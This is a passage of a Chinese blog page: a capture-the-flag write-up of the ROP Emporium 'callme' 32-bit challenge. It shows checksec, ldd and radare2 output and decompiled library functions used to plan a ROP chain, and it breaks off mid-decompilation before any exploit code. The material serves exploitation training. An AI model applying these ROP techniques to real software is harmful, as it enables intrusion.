@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guoxb.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="callme题目链接：https:&#x2F;&#x2F;ropemporium.com&#x2F;challenge&#x2F;callme.html x86根据提示可以知道，这次需要我们构造一个连续调用函数的ROP链。我们需要注意在32位环境下pop 3ret这种情况，来进行堆栈平衡。提示中告诉我们要依次调用call_one()，call_two()，call_three()这三个函数，每一个函数的参数均为0xdeadbeef, 0">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Challenge3_callme">
+<meta property="og:url" content="http://guoxb.top/2023/03/15/ROP_Emporium/Challenge3-callme/index.html">
+<meta property="og:site_name" content="GuoXB&#39;s Blog">
+<meta property="og:description" content="callme题目链接：https:&#x2F;&#x2F;ropemporium.com&#x2F;challenge&#x2F;callme.html x86根据提示可以知道，这次需要我们构造一个连续调用函数的ROP链。我们需要注意在32位环境下pop 3ret这种情况，来进行堆栈平衡。提示中告诉我们要依次调用call_one()，call_two()，call_three()这三个函数，每一个函数的参数均为0xdeadbeef, 0">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/pwn%E5%AD%A6%E4%B9%A0.drawio.png">
+<meta property="og:image" content="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/pop3ret.png">
+<meta property="og:image" content="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230313201914238.png">
+<meta property="og:image" content="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230313202037300.png">
+<meta property="article:published_time" content="2023-03-15T15:42:45.000Z">
+<meta property="article:modified_time" content="2023-03-28T13:59:47.663Z">
+<meta property="article:author" content="郭小白QAQ">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/pwn%E5%AD%A6%E4%B9%A0.drawio.png">
+
+<link rel="canonical" href="http://guoxb.top/2023/03/15/ROP_Emporium/Challenge3-callme/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Challenge3_callme | GuoXB's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">GuoXB's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://guoxb.top/2023/03/15/ROP_Emporium/Challenge3-callme/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/202303122318253.jpg">
+      <meta itemprop="name" content="郭小白QAQ">
+      <meta itemprop="description" content="精彩不亮丽，起落是无常">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="GuoXB's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Challenge3_callme
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-15 23:42:45" itemprop="dateCreated datePublished" datetime="2023-03-15T23:42:45+08:00">2023-03-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-28 21:59:47" itemprop="dateModified" datetime="2023-03-28T21:59:47+08:00">2023-03-28</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ROP-Emporium/" itemprop="url" rel="index"><span itemprop="name">ROP_Emporium</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>9 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h1><p>题目链接：<a target="_blank" rel="noopener" href="https://ropemporium.com/challenge/callme.html">https://ropemporium.com/challenge/callme.html</a></p>
+<h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><p>根据提示可以知道，这次需要我们构造一个连续调用函数的ROP链。我们需要注意在32位环境下<code>pop 3ret</code>这种情况，来进行堆栈平衡。提示中告诉我们要依次调用<code>call_one()</code>，<code>call_two()</code>，<code>call_three()</code>这三个函数，每一个函数的参数均为<code>0xdeadbeef, 0xcafebabe, 0xd00df00d</code>，eg.<code>call_one(0xdeadbeef, 0xcafebabe, 0xd00df00d)</code>我们需要构造一个依次调用这三个函数的ROP链。</p>
+<span id="more"></span>
+
+<p>首先，照例查看保护情况：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec ./callme32</span> </span><br><span class="line">[*]&#x27;/home/giantbranch/Desktop/rop_emporium_all_challenges/level3_callme/32/callme32&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RUNPATH:  &#x27;.&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这里看别人的write up都关注了一下PIE，暂时先不管，以后再回来说。</p>
+<p>题目给了<code>.so</code>文件，使用<code>ldd</code>查看下依赖库：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ldd ./callme32</span> </span><br><span class="line">	linux-gate.so.1 =&gt;  (0xf7fb4000)</span><br><span class="line">	libcallme32.so =&gt; ./libcallme32.so (0xf7fad000)</span><br><span class="line">	libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7ddc000)</span><br><span class="line">	/lib/ld-linux.so.2 (0xf7fb6000)</span><br></pre></td></tr></table></figure>
+
+<p>确实用到了提供的库（废话，这不是肯定的嘛）</p>
+<p>接下来我们看下用到了程序里的函数：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">r2 -A ./callme32</span> </span><br><span class="line"><span class="meta prompt_">[0x08048570]&gt; </span><span class="language-bash">afl</span></span><br><span class="line">0x08048570    1     50 entry0</span><br><span class="line">0x080485a3    1      4 fcn.080485a3</span><br><span class="line">0x08048520    1      6 sym.imp.__libc_start_main</span><br><span class="line">0x0804848c    3     35 sym._init</span><br><span class="line">0x080485c0    1      4 sym.__x86.get_pc_thunk.bx</span><br><span class="line">0x08048560    1      6 sym..plt.got</span><br><span class="line">0x08048804    1     20 sym._fini</span><br><span class="line">0x080485d0    4     41 sym.deregister_tm_clones</span><br><span class="line">0x08048610    4     54 sym.register_tm_clones</span><br><span class="line">0x08048650    3     31 sym.__do_global_dtors_aux</span><br><span class="line">0x08048680    1      6 sym.frame_dummy</span><br><span class="line">0x080486ed    1     98 sym.pwnme</span><br><span class="line">0x08048540    1      6 sym.imp.memset</span><br><span class="line">0x08048500    1      6 sym.imp.puts</span><br><span class="line">0x080484d0    1      6 sym.imp.printf</span><br><span class="line">0x080484c0    1      6 sym.imp.read</span><br><span class="line">0x0804874f    1     67 sym.usefulFunction</span><br><span class="line">0x080484e0    1      6 sym.imp.callme_three</span><br><span class="line">0x08048550    1      6 sym.imp.callme_two</span><br><span class="line">0x080484f0    1      6 sym.imp.callme_one</span><br><span class="line">0x08048510    1      6 sym.imp.exit</span><br><span class="line">0x08048800    1      2 sym.__libc_csu_fini</span><br><span class="line">0x080487a0    4     93 sym.__libc_csu_init</span><br><span class="line">0x080485b0    1      2 sym._dl_relocate_static_pie</span><br><span class="line">0x08048686    1    103 main</span><br><span class="line">0x08048530    1      6 sym.imp.setvbuf</span><br></pre></td></tr></table></figure>
+
+<p>其中带有<code>imp</code>的（即imports）就是从外部导入的函数，也可以通过<code>ii</code>命令或者<code>rabin2 -i ./callme</code>来查看：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">[0x08048570]&gt; </span><span class="language-bash">ii</span></span><br><span class="line">[Imports]</span><br><span class="line">nth vaddr      bind   type   lib name</span><br><span class="line">―――――――――――――――――――――――――――――――――――――</span><br><span class="line">1   0x080484c0 GLOBAL FUNC       read</span><br><span class="line">2   0x080484d0 GLOBAL FUNC       printf</span><br><span class="line">3   0x080484e0 GLOBAL FUNC       callme_three</span><br><span class="line">4   0x080484f0 GLOBAL FUNC       callme_one</span><br><span class="line">5   0x08048500 GLOBAL FUNC       puts</span><br><span class="line">6   0x00000560 WEAK   NOTYPE     __gmon_start__</span><br><span class="line">7   0x08048510 GLOBAL FUNC       exit</span><br><span class="line">8   0x08048520 GLOBAL FUNC       __libc_start_main</span><br><span class="line">9   0x08048530 GLOBAL FUNC       setvbuf</span><br><span class="line">10  0x08048540 GLOBAL FUNC       memset</span><br><span class="line">11  0x08048550 GLOBAL FUNC       callme_two</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>callme_one</code>，<code>callme_two</code>，<code>callme_three</code>都是外部导入，其实也就是<code>libcallme32.so</code>中的函数。</p>
+<hr>
+<p>其实我们不用具体看这三个函数是干什么的，也可以做。这里我们在<code>libcallme32.so</code>中查看这三个函数的功能。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">r2 -A libcallme32.so</span></span><br><span class="line"><span class="meta prompt_">[0x00000540]&gt; </span><span class="language-bash">afl</span></span><br><span class="line">0x00000540    1      4 entry0</span><br><span class="line">0x00000755   11    256 sym.callme_two</span><br><span class="line">0x00000510    1      6 sym.imp.fopen</span><br><span class="line">0x000004f0    1      6 sym.imp.puts</span><br><span class="line">0x00000500    1      6 sym.imp.exit</span><br><span class="line">0x00000520    1      6 sym.imp.fgetc</span><br><span class="line">0x00000484    3     35 sym._init</span><br><span class="line">0x00000538    1      6 fcn.00000538</span><br><span class="line">0x000009ec    1     20 sym._fini</span><br><span class="line">0x00000855   10    406 sym.callme_three</span><br><span class="line">0x0000063d   10    280 sym.callme_one</span><br><span class="line">0x000004e0    1      6 sym.imp.malloc</span><br><span class="line">0x000004c0    1      6 sym.imp.fgets</span><br><span class="line">0x000004d0    1      6 sym.imp.fclose</span><br><span class="line">0x00000550    4     53 sym.deregister_tm_clones</span><br><span class="line">0x00000639    1      4 sym.__x86.get_pc_thunk.dx</span><br><span class="line">0x00000590    4     71 sym.register_tm_clones</span><br><span class="line">0x000005e0    5     71 sym.__do_global_dtors_aux</span><br><span class="line">0x00000530    1      6 sym..plt.got</span><br><span class="line">0x00000630    1      9 sym.frame_dummy</span><br><span class="line">0x00000000    8    332 loc.imp._ITM_deregisterTMCloneTable</span><br></pre></td></tr></table></figure>
+
+<p>从中我们也能看到<code>callme_one</code>，<code>callme_two</code>，<code>callme_three</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x00000540</span>]&gt; s sym.callme_one </span><br><span class="line">[<span class="number">0x0000063d</span>]&gt; pdg</span><br><span class="line"></span><br><span class="line"><span class="comment">// WARNING: Variable defined which should be unmapped: var_4h</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> sym.callme_one(<span class="type">int32_t</span> arg_8h, <span class="type">int32_t</span> arg_ch, <span class="type">int32_t</span> arg_10h)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int32_t</span> iVar1;</span><br><span class="line">    uint uVar2;</span><br><span class="line">    <span class="type">int32_t</span> unaff_EBX;</span><br><span class="line">    uint stream;</span><br><span class="line">    uint var_4h;</span><br><span class="line">    </span><br><span class="line">    entry0();</span><br><span class="line">    <span class="keyword">if</span> (((arg_8h != <span class="number">-0x21524111</span>) || (arg_ch != <span class="number">-0x35014542</span>)) || (arg_10h != <span class="number">-0x2ff20ff3</span>)) &#123;</span><br><span class="line">        sym.imp.<span class="built_in">puts</span>(unaff_EBX + <span class="number">0x429</span>);</span><br><span class="line">    <span class="comment">// WARNING: Subroutine does not return</span></span><br><span class="line">        sym.imp.<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    iVar1 = sym.imp.fopen(unaff_EBX + <span class="number">0x3b9</span>, unaff_EBX + <span class="number">0x3b7</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">        sym.imp.<span class="built_in">puts</span>(unaff_EBX + <span class="number">0x3cf</span>);</span><br><span class="line">    <span class="comment">// WARNING: Subroutine does not return</span></span><br><span class="line">        sym.imp.<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    uVar2 = sym.imp.<span class="built_in">malloc</span>(<span class="number">0x21</span>);</span><br><span class="line">    *(unaff_EBX + <span class="number">0x19e7</span>) = uVar2;</span><br><span class="line">    <span class="keyword">if</span> (*(unaff_EBX + <span class="number">0x19e7</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        sym.imp.<span class="built_in">puts</span>(unaff_EBX + <span class="number">0x3f1</span>);</span><br><span class="line">    <span class="comment">// WARNING: Subroutine does not return</span></span><br><span class="line">        sym.imp.<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    uVar2 = sym.imp.fgets(*(unaff_EBX + <span class="number">0x19e7</span>), <span class="number">0x21</span>, iVar1);</span><br><span class="line">    *(unaff_EBX + <span class="number">0x19e7</span>) = uVar2;</span><br><span class="line">    sym.imp.fclose(iVar1);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(unaff_EBX + <span class="number">0x40b</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x0000063d</span>]&gt; s sym.callme_two </span><br><span class="line">[<span class="number">0x00000755</span>]&gt; pdg</span><br><span class="line"></span><br><span class="line"><span class="comment">// WARNING: Variable defined which should be unmapped: var_8h</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> sym.callme_two(<span class="type">int32_t</span> arg_8h, <span class="type">int32_t</span> arg_ch, <span class="type">int32_t</span> arg_10h)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> uVar1;</span><br><span class="line">    <span class="type">int32_t</span> iVar2;</span><br><span class="line">    <span class="type">int32_t</span> unaff_EBX;</span><br><span class="line">    <span class="type">int32_t</span> var_10h;</span><br><span class="line">    uint stream;</span><br><span class="line">    uint var_8h;</span><br><span class="line">    </span><br><span class="line">    entry0();</span><br><span class="line">    <span class="keyword">if</span> (((arg_8h == <span class="number">-0x21524111</span>) &amp;&amp; (arg_ch == <span class="number">-0x35014542</span>)) &amp;&amp; (arg_10h == <span class="number">-0x2ff20ff3</span>)) &#123;</span><br><span class="line">        iVar2 = sym.imp.fopen(unaff_EBX + <span class="number">0x325</span>, unaff_EBX + <span class="number">0x29e</span>);</span><br><span class="line">        <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">            sym.imp.<span class="built_in">puts</span>(unaff_EBX + <span class="number">0x32e</span>);</span><br><span class="line">    <span class="comment">// WARNING: Subroutine does not return</span></span><br><span class="line">            sym.imp.<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (var_10h = <span class="number">0</span>; var_10h &lt; <span class="number">0x10</span>; var_10h = var_10h + <span class="number">1</span>) &#123;</span><br><span class="line">            uVar1 = sym.imp.fgetc(iVar2);</span><br><span class="line">            *(var_10h + *(unaff_EBX + <span class="number">0x18ce</span>)) = uVar1 ^ *(var_10h + *(unaff_EBX + <span class="number">0x18ce</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        sym.imp.<span class="built_in">puts</span>(unaff_EBX + <span class="number">0x346</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(unaff_EBX + <span class="number">0x310</span>);</span><br><span class="line">    <span class="comment">// WARNING: Subroutine does not return</span></span><br><span class="line">    sym.imp.<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x00000755</span>]&gt; s sym.callme_three </span><br><span class="line">[<span class="number">0x00000855</span>]&gt; pdg</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> sym.callme_three <span class="title function_">noreturn</span> <span class="params">(<span class="type">int32_t</span> arg_8h, <span class="type">int32_t</span> arg_ch, <span class="type">int32_t</span> arg_10h)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> uVar1;</span><br><span class="line">    <span class="type">int32_t</span> iVar2;</span><br><span class="line">    <span class="type">int32_t</span> unaff_EBX;</span><br><span class="line">    <span class="type">int32_t</span> var_10h;</span><br><span class="line">    uint stream;</span><br><span class="line">    </span><br><span class="line">    entry0();</span><br><span class="line">    <span class="keyword">if</span> (((arg_8h == <span class="number">-0x21524111</span>) &amp;&amp; (arg_ch == <span class="number">-0x35014542</span>)) &amp;&amp; (arg_10h == <span class="number">-0x2ff20ff3</span>)) &#123;</span><br><span class="line">        iVar2 = sym.imp.fopen(unaff_EBX + <span class="number">0x264</span>, unaff_EBX + <span class="number">0x19e</span>);</span><br><span class="line">        <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">            sym.imp.<span class="built_in">puts</span>(unaff_EBX + <span class="number">0x26d</span>);</span><br><span class="line">    <span class="comment">// WARNING: Subroutine does not return</span></span><br><span class="line">            sym.imp.<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (var_10h = <span class="number">0x10</span>; var_10h &lt; <span class="number">0x20</span>; var_10h = var_10h + <span class="number">1</span>) &#123;</span><br><span class="line">            uVar1 = sym.imp.fgetc(iVar2);</span><br><span class="line">            *(var_10h + *(unaff_EBX + <span class="number">0x17ce</span>)) = uVar1 ^ *(var_10h + *(unaff_EBX + <span class="number">0x17ce</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        *(*(unaff_EBX + <span class="number">0x17ce</span>) + <span class="number">4</span>) = *(*(unaff_EBX + <span class="number">0x17ce</span>) + <span class="number">4</span>) ^ <span class="number">0xdeadbeef</span>;</span><br><span class="line">        *(*(unaff_EBX + <span class="number">0x17ce</span>) + <span class="number">8</span>) = *(*(unaff_EBX + <span class="number">0x17ce</span>) + <span class="number">8</span>) ^ <span class="number">0xdeadbeef</span>;</span><br><span class="line">        *(*(unaff_EBX + <span class="number">0x17ce</span>) + <span class="number">0xc</span>) = *(*(unaff_EBX + <span class="number">0x17ce</span>) + <span class="number">0xc</span>) ^ <span class="number">0xcafebabe</span>;</span><br><span class="line">        *(*(unaff_EBX + <span class="number">0x17ce</span>) + <span class="number">0x10</span>) = *(*(unaff_EBX + <span class="number">0x17ce</span>) + <span class="number">0x10</span>) ^ <span class="number">0xcafebabe</span>;</span><br><span class="line">        *(*(unaff_EBX + <span class="number">0x17ce</span>) + <span class="number">0x14</span>) = *(*(unaff_EBX + <span class="number">0x17ce</span>) + <span class="number">0x14</span>) ^ <span class="number">0xd00df00d</span>;</span><br><span class="line">        *(*(unaff_EBX + <span class="number">0x17ce</span>) + <span class="number">0x18</span>) = *(*(unaff_EBX + <span 